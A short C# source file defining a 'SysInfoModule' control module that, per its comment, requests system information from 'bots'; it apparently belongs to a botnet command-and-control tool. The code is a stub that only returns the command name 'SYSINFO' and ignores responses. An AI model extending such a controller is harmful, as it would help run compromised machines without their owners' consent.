using System;

namespace Ananke.Modules {
    /// <summary>
    ///     Control mode that requests system info from bots
    /// </summary>
    public class SysInfoModule : IControlModule {
        public string Identifier => "SYSINFO";

        public string Activate() {
            return Identifier;
        }

        public void ResponseReceived(string response) {
            //throw new NotImplementedException();
        }
    }
}
